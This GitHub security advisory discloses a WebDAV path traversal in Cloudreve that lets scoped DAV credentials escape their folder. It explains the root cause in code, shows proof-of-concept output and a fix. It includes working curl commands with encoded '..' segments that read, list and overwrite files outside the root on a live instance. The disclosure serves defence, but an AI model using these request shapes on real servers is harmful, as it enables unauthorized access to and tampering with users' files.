# [H] Cloudreve WebDAV (`/dav`) has Path Traversal / Broken Access Control — scoped DAV credential escapes its configured account root

## Summary
Severity: High
Advisory: GHSA-w5fv-7x5q-g8qp
CVE: CVE-2026-54563
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-26
Source: https://github.com/advisories/GHSA-w5fv-7x5q-g8qp
Type: github-advisory

## Affected
- Go: `github.com/cloudreve/Cloudreve/v4` — affected >=0 <4.0.0-20260606032813-26b6b1044b02
- Go: `github.com/cloudreve/Cloudreve/v3` — affected >=0

## Details
## Summary

A Cloudreve WebDAV account stores a `uri` that defines the account's root folder. The WebDAV request handler (`stripPrefix` in `pkg/webdav/webdav.go`) trims the `/dav` prefix from the request path and joins the remainder to that root with `fs.URI.JoinRaw`, but never checks that the joined URI stays inside the root.

Go's `net/http` decodes `%2e%2e` to `..` and `%2f` to `/` in `r.URL.Path` before the handler sees it, and `JoinRaw` resolves `..` segments through the standard library's `url.URL.JoinPath`. A request such as `GET /dav/%2e%2e/outside.txt` against a credential rooted at `cloudreve://my/restricted` therefore resolves to `cloudreve://my/outside.txt`. A scoped DAV credential can read and list files outside its configured folder; a writable scoped credential can also create, overwrite, move, and delete them.

The escape stays inside the same Cloudreve user's namespace because downstream DBFS owner checks still apply. It does not cross into another user's files or onto the OS filesystem. What it breaks is the per-folder WebDAV-account boundary — the entire reason scoped DAV accounts exist (delegating limited access to a sync client or a third party).

## Technical Detail

### Root cause

`stripPrefix` joins the request suffix onto the account base with no containment check:

```go
// pkg/webdav/webdav.go @ 54dc81d
func stripPrefix(p string, u *ent.User) (string, *fs.URI, int, error) {
	base, err := fs.NewUriFromString(u.Edges.DavAccounts[0].URI)
	if err != nil {
		return "", nil, http.StatusInternalServerError, err
	}

	prefix := davPrefix // "/dav"
	if r := strings.TrimPrefix(p, prefix); len(r) < len(p) {
		r = strings.TrimPrefix(r, fs.Separator)
		return r, base.JoinRaw(util.RemoveSlash(r)), http.StatusOK, nil // <-- join, no boundary check
	}
	return "", nil, http.StatusNotFound, errPrefixMismatch
}
```

`JoinRaw` splits on `/` and delegates to the standard library:

```go
// pkg/filemanager/fs/uri.go @ 54dc81d
func (u *URI) JoinRaw(elem string) *URI {
	return u.Join(strings.Split(strings.TrimPrefix(elem, Separator), Separator)...)
}

func (u *URI) Join(elem ...string) *URI {
	newUrl, _ := url.Parse(u.U.String())
	return &URI{U: newUrl.JoinPath(lo.Map(elem, func(s string, i int) string {
		return PathEscape(s)
	})...)}
}
```

`PathEscape` leaves a `.` untouched (`shouldEscape` returns `false` for `.`), so the literal segment `..` survives into `url.URL.JoinPath`, which cleans the path and resolves the parent reference.


## Proof of Concept

The full server was not run from the checkout (the embedded frontend asset `assets.zip` is absent from source), so the chain was proven by exercising the two decisive layers with real code rather than a screenshot of a live instance.

### Layer 1 — `net/http` hands the handler a decoded, *uncleaned* path

A standard-library HTTP server, hit over a real socket with raw request targets (equivalent to `curl --path-as-is`), shows what `c.Request.URL.Path` holds inside the handler:

```
REQUEST: GET /dav/%2e%2e/outside.txt
  handler observed: URL.Path="/dav/../outside.txt"   RawPath="/dav/%2e%2e/outside.txt"   -> 200
REQUEST: PROPFIND /dav/%2e%2e/
  handler observed: URL.Path="/dav/../"              RawPath="/dav/%2e%2e/"               -> 200
REQUEST: PUT /dav/%2e%2e/created-outside.txt
  handler observed: URL.Path="/dav/../created-outside.txt"                                 -> 200
REQUEST: GET /dav/%2F..%2Foutside.txt
  handler observed: URL.Path="/dav//../outside.txt"  RawPath="/dav/%2F..%2Foutside.txt"   -> 200
```

The path is decoded but never cleaned. Gin does not rewrite `Request.URL.Path`, so the Cloudreve handler observes the same value.

### Layer 2 — Cloudreve's URI resolution escapes the root

Re-running Cloudreve's exact `PathEscape` / `shouldEscape` / `Join` / `JoinRaw` / `NewUriFromString` code (copied verbatim from `uri.go @ 54dc81d`) against the real `net/url` library, with base `cloudreve://my/restricted`:

```
traversal %2e%2e        URL.Path=/dav/../outside.txt     suffix="../outside.txt"     => cloudreve://my/outside.txt
traversal %2F..%2F      URL.Path=/dav//../outside.txt    suffix="/../outside.txt"    => cloudreve://my/outside.txt
benign nested           URL.Path=/dav/sub/normal.txt     suffix="sub/normal.txt"     => cloudreve://my/restricted/sub/normal.txt
double-encoded (ctrl)   URL.Path=/dav/%2e%2e/outside.txt suffix="%2e%2e/outside.txt" => cloudreve://my/restricted/%252e%252e/outside.txt
deep traversal          URL.Path=/dav/../../etc.txt      suffix="../../etc.txt"      => cloudreve://my/etc.txt
```

The traversal variants land outside `restricted`; the benign path stays inside; the double-encoded negative control stays literal under the root; and deep traversal clamps at the `my` root (host stays `my`, confirming the same-owner ceiling).

### Live request shapes (against a deployed instance)

```bash
# Read outside the DAV root (works for read-only credentials too)
curl --path-as-is -i -u 'victim@example.com:DAV_PASSWORD' \
  'https://cloudreve.example/dav/%2e%2e/outside.txt'

# List outside the DAV root
curl --path-as-is -i -X PROPFIND -H 'Depth: 1' \
  -u 'victim@example.com:DAV_PASSWORD' \
  'https://cloudreve.example/dav/%2e%2e/'

# Write outside the DAV root (writable credentials)
printf 'created outside DAV root\n' | curl --path-as-is -i -X PUT \
  -u 'victim@example.com:DAV_PASSWORD' --data-binary @- \
  'https://cloudreve.example/dav/%2e%2e/created-outside.txt'
```

## Impact

- **Read-only scoped credential**: read and list any file in the owner's namespace, outside the folder the credential was scoped to.
- **Writable scoped credential**: additionally create, overwrite, move, and delete those files.

In normal use a scoped DAV account is the mechanism for handing limited access to a sync client or an outside party. This bug means that limit is not enforced: the credential reaches the owner's whole `my` filesystem.

## Suggested Fix

`fs.URI` already ships the predicate needed (`EqualOrIsDescendantOf`), so the fix is small:

```diff
 	prefix := davPrefix
 	if r := strings.TrimPrefix(p, prefix); len(r) < len(p) {
 		r = strings.TrimPrefix(r, fs.Separator)
-		return r, base.JoinRaw(util.RemoveSlash(r)), http.StatusOK, nil
+		candidate := base.JoinRaw(util.RemoveSlash(r))
+		if !candidate.EqualOrIsDescendantOf(base, "") {
+			return "", nil, http.StatusForbidden, errPrefixMismatch
+		}
+		return r, candidate, http.StatusOK, nil
 	}
 	return "", nil, http.StatusNotFound, errPrefixMismatch
```

Regression tests worth adding:

- `/dav/%2e%2e/outside.txt` from base `cloudreve://my/restricted` → rejected
- `/dav/%2F..%2Foutside.txt` from base `cloudreve://my/restricted` → rejected
- `COPY`/`MOVE` with `Destination: https://host/dav/%2e%2e/outside.txt` → rejected
- `/dav/sub/normal.txt` → still resolves under the account root

## References
- https://github.com/cloudreve/cloudreve/security/advisories/GHSA-w5fv-7x5q-g8qp
- https://nvd.nist.gov/vuln/detail/CVE-2026-54563
- https://github.com/cloudreve/cloudreve
- https://github.com/cloudreve/cloudreve/releases/tag/4.16.1
